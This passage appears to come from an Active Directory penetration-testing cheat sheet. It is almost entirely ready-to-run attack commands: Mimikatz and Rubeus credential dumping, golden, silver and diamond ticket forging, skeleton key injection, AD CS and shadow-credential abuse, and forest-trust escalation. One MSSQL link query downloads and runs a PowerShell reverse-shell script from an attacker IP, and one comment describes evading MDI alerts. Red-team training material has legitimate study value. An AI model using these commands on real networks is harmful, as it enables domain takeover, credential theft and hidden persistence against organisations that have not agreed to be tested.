Invoke-Mimikatz -Command '"kerberos::ptt <kirbi-file-from-previous>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'

# Abuse using Rubeus:
Rubeus.exe hash /password:Password@123! /user:<newuser> /domain:<domain>
Rubeus.exe s4u /user:<newuser> /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/<CD-FQDN> /domain:<domain> /ptt
SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
```

**Golden Ticket:**  

```powershell
# Note: /sid: is the domain's SID
# Note: can use NTLM hash or AES key
# Execute mimikatz on DC to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
# Or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
# On a machine which can reach the DC over network:
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:<ntlm> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Using SafetyKatz
SafetyKatz.exe "lsadump::lsa /patch" "exit"
# or
SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
# On a machine which can reach the DC over network (Need elevation):
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:<ntlm> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

**Silver Ticket:**  

```powershell
# Using hash of the Domain Controller computer account, below command provides access to shares on the DC.
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:S-1-5-21-210670787-2521448726-163245708 /target:<DC-FQDN> /service:cifs /rc4:<ntlm> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
# Can use others tools used above.
```

**Diamond Ticket:**  

```powershell
# We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):
Rubeus.exe diamond /krbkey:<hash> /user:<foothold-user> /password:<foothold-password> /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<domain-DC> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
Rubeus.exe diamond /krbkey:<hash> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<domain-DC> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Skeleton Key:**  

```powershell
# Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <dc-name>
# Now, it is possible to access any machine with a valid username and password as "mimikatz"
Enter-PSSession –Computername <domain-computer> –credential <domain>\Administrator
# You can access other machines as well as long as they authenticate with the DC which has been patched and the DC is not rebooted
```

If lsass is a protected process, can use skeleton key but needs mimikatz driver (mimidriv.sys) on disk of the target DC:  

```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
# The above is very noisy in the logs due to service creation
```

To set a custom skeleton key password:  
See - https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c#L611  
For example, to use "S3c3rtP@ss", compute its RC4 and split it into 8 bytes stubs:  
56aa742a  
6bebb9ca  
62fc9f70  
a2e00cd3  
Reverse the values by 2 bytes  
2a74aa56  
cab9eb6b  
709ffc62  
d30ce0a2  
Prepend 0x to each and modify kiwikey array value in the code linked above  
`DWORD kiwiKey[] = {0x2a74aa56, 0xcab9eb6b, 0x709ffc62, 0xd30ce0a2}`  

**DSRM:**  
DA privs on DC  

```powershell
# Dump DSRM password (needs DA privs)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername us-dc
# Compare the Administrator hash with the Administrator hash of below command
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc
# First one is the DSRM local Administrator
```

OPTH the DSRM pass to authenticate, but the logon behaviour needs to be changed:  

```powershell
Enter-PSSession -Computername us-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# OPTH:
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<dc> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
ls \\<dc>\C$
# To use PSRemoting, we must force NTLM authentication:
Enter-PSSession -ComputerName us-dc -Authentication Negotiate
```

## Cross Trust Attacks

**AD CS Enumeration**  

```powershell
# We can use the Certify tool (https://github.com/GhostPack/Certify) to enumerate (and for other attacks) AD CS in the target forest:
# Run on the DC
Certify.exe cas
# Enumerate the templates:
Certify.exe find
# Enumerate vulnerable templates:
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject

# User certify.exe with no parameters for help and usage examples
```

**AD CS Priv Esc**  

```powershell
# If you have a pfx certificate:
Rubeus.exe asktgt /user:<username> /certificate:<compromised-cert>.pfx /password:SecretPass@123 /nowrap /ptt
# the password needs to be the same password used when extracting the certificate from the registry

# Request a certificate for DA! (use the vulnerable template)
Certify.exe request /ca:<CA-server> /template:<vuln-template-name> /altname:Administrator
# Copy the output from above and save to a .pem file
# Convert from cert.pem to pfx:
openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export-out DA.pfx
# There will be a prompt for a password - this same password must be used when importing the pfx file
# Request DA TGT and inject it:
Rubeus.exe asktgt /user:Administrator /certificate:DA.pfx /password:SecretPass@123 /nowrap /ptt
# password is from openssl command

# Alt command to request enterprise admin TGT and inject it
# Specify /user from the parent domain (forest root) and the /dc from the parent domain (forest root)
Rubeus.exe asktgt /user:<parent.local>\Administrator /dc:<dc.parent.local> /certificate:EA.pfx /password:SecretPass@123 /nowrap /ptt
```

**Shadow Credentials:**  
Pre-reqs:  
- AD CS (Key Trust if AD CS is not present).  
- Support for PKINIT and at least one DC with Windows Server 2016 or above.  
- Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object.  

```powershell
# Abuse user object
# Enumerate the permissions with PowerView
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<groupName>"}
# Add the Shadow Credential.
Whisker.exe add /target:<target-user>
# Using PowerView, see if the Shadow Credential is added.
Get-DomainUser -Identity <target-user>

# Request the TGT by leveraging the certificate.
Rubeus.exe asktgt /user:<target-user /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:<current.domain.local> /dc:<dc.current.local> /getcredentials /show /nowrap
# Inject the TGT in the current session or use the NTLM hash
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

```powershell
# Abuse computer object
# Enumerate the permissions with PowerView
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<compromisedUser>’}
# Add the Shadow Credentials.
SafetyKatz.exe "sekurlsa::pth /user:<compromisedUser> /domain:<current.domain.local> /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe" "exit"
Whisker.exe add /target:<targetMachine$>
# Using PowerView, see if the Shadow Credential is added.
Get-DomainComputer -Identity <targetMachine>

# Request the TGT by leveraging the certificate.
Rubeus.exe asktgt /user:<targetMachine$> /certificate:MIIJ0AIBAzCCCYwGCSqGSIb... /password:"ViGFoZJa..." /domain:<current.domain.local> /dc:<dc.current.domain.local> /getcredentials /show
# Request and Inject the TGS by impersonating the user.
Rubeus.exe s4u /dc:<dc.current.domain.local> /ticket:doIGkDCCBoygAwIBBaEDAgEW... /impersonateuser:administrator /ptt /self /altservice:cifs/<targetMachine>
```

**Azure AD Integration**  

```powershell
# New user MSOL_* is created with Syncronisation rights (DCSync)
# Enumerate the PHS account and server where AD Connect is installed.
# Using PowerView:
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
# Using the ActiveDirectory module (this command will show the computer that is running AD Connect):
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl

# With admin where AD Connect is installed we can extract creds of MSOL_ account used by AD Connect in clear-text:
. .\adconnect.ps1 
# then
ADConnect
# Note that the above script's code runs powershell.exe so verbose logs (like transcripts) will be there.

# With the password, can run commands as MSOL_:
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd

# Then DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent>\krbtgt /domain:<parent.local>"'
# Note that because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the MSOL_ account will be excluded from tools like MDI! This will allow us to run DCSync without any alerts
```

## Privesc to Forest Root

Abuse SID history with:  
- krbtgt hash (child domain), or  
- trust tickets

```powershell
# Get the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <current-dc>
# or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<childDomain>\<parentDomain>$"'
# or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# Forge an inter-realm TGT
Invoke-Mimikatz -Command '"kerberos::golden /domain:<child.domain.local> /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:<parent.local> /ticket:trust_tkt.kirbi"'
# /sid is the sid for the current domain
# /sids is the sid for the enterprise admins group of the parent domain (can also use DA group SID)
# /rc4 is rc4 of the trust key

# Use the ticket - use other services for other purposes
.\Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/<parentMachine.parent.local> /dc:<parent-dc.parent.local> /ptt

ls \\<parentMachine.parent.local>\c$
```

```powershell
# Use krbtgt hash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child.domain.local> /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'
# /sid is the sid for the current domain
# /sids is the sid for the enterprise admins group of the parent domain (can also use DA group SID)
# In the above command, the mimkatz option "/sids" is forcefully setting the sIDHistory for the Enterprise Admin group for <child.domain.local> that is the Forest Enterprise Admin Group.

ls \\techcorp-dc.techcorp.local\C$
Enter-PSSession techcorp-dc.techcorp.local
```

```powershell
# Avoid suspicious logs by using Domain Controllers group:
Invoke-Mimikatz -Command '"kerberos::golden /user:<current-dc$> /domain:<current.domain.local> /sid:<child-domain-sid> /groups:516 /krbtgt:<krbtgt-ntlm> /sids:<domain-controller-group-in-parent>,S-1-5-9 /ptt"'
# S-1-5-9 – Enterprise Domain Controllers
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent>\Administrator /domain:<parent.local>"'
```

## Cross Forest

After gaining EA in forest root

**Kerberoast across forest trust**  

```powershell
# Using PowerView
Get-DomainUser -SPN -Domain <trustedDomain.local>
# Or
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}

# Using ActiveDirectory Module:
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}

# Request a TGS
Rubeus.exe kerberoast /user:<user> /simple /domain:<trustedDomain.local> /outfile:<cross-forest-hashes.txt>

# Crack using John or Hashcat
john.exe --wordlist=<wordlist.txt> <cross-forest-hashes.txt>
```

**Constrained Delegation with Protocol Transmission**  
Does not work accross forest boundaries, but will work after a  
foothold is gained in the target forest.  

```powershell
# Using PowerView
Get-DomainUser –TrustedToAuth -Domain <trustedForest.local>
Get-DomainComputer –TrustedToAuth -Domain <trustedForest.local>
# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server <trustedForest.local>

# We can request an alternate ticket using Rubeus, after compromising the user/machine password/hash
Rubeus.exe s4u /user:<user/machine$> /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:<trustedForest.local> /msdsspn:<msds-allowedtodelegateto-value> /altservice:ldap /dc:<dc.trustedForest.local> /ptt

# Abuse the TGS to LDAP:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<trustedForest>\krbtgt /domain:<trustedForest.local>"'
# Or
C:\AD\Tools\SharpKatz.exe --Command dcsync --User <trustedForest>\krbtgt --Domain <trustedForest.local> --DomainController <dc.trustedForest.local>
C:\AD\Tools\SharpKatz.exe --Command dcsync --User <trustedForest>\administrator --Domain <trustedForest.local> --DomainController <dc.trustedForest.local>
```

**Unconstrained Delegation**  

Enumerate if TGTDelegation is enabled across a forest trust, run the below command from a DC  
(or spray and pray the print spool bug on other forests' DC's and a machine that has unconstrained delegation)  
 
```powershell
# Using ActiveDirectory module:
Get-ADTrust -server <forest.local> -Filter *

# Use MS-RPRN.exe (https://github.com/leechristensen/SpoolSample):
.\MS-RPRN.exe \\<target-machine-FQDM> \\<FQDM-of-unconstrained-delegation-machine>
# We can capture the TGT of of the target machine by using Rubeus (https://github.com/GhostPack/Rubeus) on the machine with unconstrained delegation:
.\Rubeus.exe monitor /interval:5 /nowrap

# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker'machine:
.\Rubeus.exe ptt /ticket:<base64 encoded text from rubeus monitor>
# Then run DCSync on the target DC
```

**Trust Keys**  

```powershell
# We require the trust key for the inter-forest trust:
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
# or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<targetMachine$>"'
# or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
# We can also use any of the earlier discussed tools to extract trust keys

# On the forest dc before the target forest
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<currentDomain.local> /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:<targetDomain.local> /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:sharedwitheu.kirbi"'
# /sid is the current domain SID
# /rc4 is the trust key rc4
# /sids is the EA or DA group of the target domain

Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

net view \\<target.machine.local>
ls \\<target.machine.local>\share\
```

Bypass SID Filtering:  
Enumerate trusts with AD Module and look for "SIDFilteringForestAware" being set to "True"  
Need to inject SIDs with an RID value greater than 1000  
(Reapeat above code snippet process)  

**MSSQL Servers**  

```powershell
# For MSSQL and PowerShell hackery, use PowerUpSQL https://github.com/NetSPI/PowerUpSQL
# Discovery (SPN Scanning)
Get-SQLInstanceDomain

# Check Accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# HeidiSQL can be used to access linked databases: https://www.heidisql.com/
# Look for links to remote servers
Get-SQLServerLink -Instance <sql-instance> -Verbose
# We can manually enumerate linked servers from inside a MSSQL instance (Using Heidi)
select * from master..sysservers

# Openquery function can be used to run queries on a linked database
select * from openquery("192.168.23.25",'select * from master..sysservers')
# Openquery queries can be chained to access links within links (nested links)
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
# As queries are nested, the number of quotes should double for each nest
```

Executing Commands  
rcp and rpcout need to be enabled to execute commands  
Run the below commands from the DB before a link to a DB that has RPC or RPCOUT disabled  

```powershell
# On the target server, either xp_cmdshell should be already enabled; or
# If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using: (Invoke-SqlCmd is Get-SQLQuery in powerupsql)
Invoke-SqlCmd -Query "exec sp_serveroption @server='<db_server>', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query " exec sp_serveroption @server='<db_server>', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''show advanced options'',1;reconfigure;') AT ""<db_server>"""
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT ""<db_server>"""
# Reverse these settings on an engagement when completed

# From the initial SQL server, OS commands can be executed using nested link queries:
# As queries are nested, the number of quotes should double for each nest
select * from openquery("192.168.23.25",'select * from openquery("<db_server>",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
```

```powershell
# With RPC, RPC OUT and xp_cmdshell enabled on all desired links, run commands on machines:
# Crawling links to remote servers
Get-SQLServerLinkCrawl -Instance <sql-instance>
# Abusing links to remote servers (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
Get-SQLServerLinkCrawl -Instance <sql-instance> -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget <db-server>
```

**Foreign Security Principals**  

Enumerate FSPs  

```powershell
# PowerView:
Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose
Get-DomainUser -Domain <target_domain>
# Use the output from Get-DomainUser to match SIDs/RIDs to users within foreign group 

# Using ActiveDirectory module:
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"}
```

Then enumerate ACLs for the domain  

```powershell
# Powerview
Find-InterestingDomainAcl -Domain <target-domain>
# Look for an ACL that a user within a ForeignGroup has, which can be abused
# We could reset the password of a user if an account we have comrpomised, has GenericAll rights over a user that is within a Foreign Group
# E.g. with PowerView
Set-DomainUserPassword -Identity <targetUser-InForeignGroup> -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain <target_domain> -Verbose
winrs -r:<domain> -u:<targetdomain>\<target_user> -p:Password@123 "cmd.exe"
```

**Abusing PAM Trust**  

Usually enabled between a Bastion or Red Forest and a production/user forest.  

```powershell
# With AD privs
# AD Module
Get-ADTrust -Filter *
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server <bastion.local>
# Convert any SIDs to usernames to determine which user to impersonate
Get-ADUser -Filter * -Server <domain> | ?{$_.SID -match '<SID>'}
# Perform OPTH to start a cmd session as the user identified above
# Could then perform DCSync attack to get hashes from bastion domain, e.g. Administrator of <bastion.local>
# OPTH again with new creds to get access to bastion domain

# On <bastion-dc>, enumerate if there is a PAM trust:
$bastiondc = New-PSSession <bastion-dc.bastion.local>
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc
# Check which users are members of the Shadow Principals:
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc

# Use OPTH to get a shell as the <bastion-dc> Admin then
# Establish a direct PSRemoting session on bastion-dc and access production.local:
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```
